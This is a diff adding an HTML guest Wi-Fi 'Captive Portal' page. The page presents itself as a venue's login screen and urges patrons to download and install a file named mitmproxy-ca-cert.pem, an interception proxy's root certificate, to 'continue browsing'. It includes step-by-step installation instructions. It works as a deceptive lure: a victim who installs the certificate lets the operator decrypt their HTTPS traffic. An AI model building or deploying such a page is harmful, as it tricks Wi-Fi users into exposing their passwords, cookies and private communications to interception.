@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Captive Portal</title>
+    <style>
+
+        body {
+            padding: 1vh 1vw;
+            margin: 2vh; 
+            justify-content: center;
+            background-color: rgb(42, 43, 43);
+        }
+
+        button{
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-size: 2vw;
+            text-align: center;
+            text-align: center;
+            border: 4px solid lightskyblue;
+            border-radius: 4px;
+            background: none;
+            background-color: lightskyblue;
+            transition-duration: 0.4s;
+            padding: 1vh 1vw; 
+        }
+
+        button:hover{
+            background-color: white; 
+            border: 4px solid lightskyblue;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .text{
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-size: 2vw; 
+            text-align: center; 
+            margin: 5px; 
+        }
+
+        section{
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            padding: 2vh 2vw;
+        }
+
+        .welctext{
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-size: 5vw; 
+            text-align: center; 
+            margin: 0;
+            font-weight: bold;
+        }
+
+        div{
+            align-items: center;
+            justify-content: center;
+            background-color: white;
+            border-radius: 4px;
+            padding: 5vh 2vw; 
+        }
+
+    </style>
+</head>
+
+<body>
+    <section>
+        <div>
+            <section>
+                <p class="welctext">Welcome Patrons! </p>
+            </section>
+
+            <p class = "text">Enjoy your free guest Wi-Fi!</p>
+            <p class = "text">Please download and install this certificate to continue browsing the internet!</p>
+
+            <section style = "padding: 0;">
+                <img src = "wifilogo.png" style = "width: 100px; height: 100px;">
+            </section>
+
+            <section>
+                <a href="mitmproxy-ca-cert.pem" download="">
+                    <button> 
+                        Accept and Connect
+                    </button>
+                </a>
+            </section>
+            <p class = "text">Instructions for installation:</p>
+            <ol>
+                <li class="text">Download the certificate using the link above.</li>
+                <li class="text">Install the certificate according to your device's instructions.</li>
+            </ol>
+
+            <p class = "text">Once the certificate is installed, reconnect to the Wi-Fi to access the internet.</p>
+        </div>
+    </section>
+</body>
+</html>
